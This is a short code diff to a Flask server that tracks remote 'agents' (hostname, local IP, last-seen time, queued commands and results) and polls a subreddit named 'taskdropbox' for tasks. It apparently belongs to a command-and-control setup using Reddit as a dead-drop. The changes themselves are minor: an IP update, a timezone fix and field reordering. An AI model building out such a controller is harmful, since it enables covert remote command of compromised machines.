@@ -158,18 +158,16 @@ def get_agents_with_commands(id):
         "Command": c.command,
         "Status": c.status,
         "Result": c.result
-
-    } for c in agent.commands]  
+    } for c in agent.commands]
 
     return jsonify({
         "Agent Id": agent.agent_id,
-        "Commands": cmd_list,
         "Hostname": agent.hostname,
         "Local IP": agent.local_ip,
         "Status": agent.status,
-        "Last Seen": agent.last_seen
+        "Last Seen": agent.last_seen.isoformat() if agent.last_seen else None,
+        "Commands": cmd_list
     })
-    
 
 def poll_reddit():
     with open("config.json") as f:
@@ -183,7 +181,7 @@ def poll_reddit():
         user_agent=creds["user_agent"]
     )
 
-    SERVER_URL = "http://192.168.1.69:5555"  # Flask local
+    SERVER_URL = "http://192.168.1.76:5555"  # Flask local
     SUBREDDIT = "taskdropbox"
 
     while True:
@@ -209,7 +207,7 @@ def poll_reddit():
         
 def monitor_agents():
     while True:
-        now = datetime.utcnow()
+        now = datetime.now(timezone.utc)
         with app.app_context():
             agents = Agent.query.all()
             for a in agents:
@@ -235,4 +233,4 @@ if __name__ == "__main__":
     Thread(target=poll_reddit, daemon=True).start()
     Thread(target=monitor_agents, daemon=True).start()
 
-    app.run(host="192.168.1.69", port=5555, debug=True)
+    app.run(host="192.168.1.76", port=5555, debug=True)
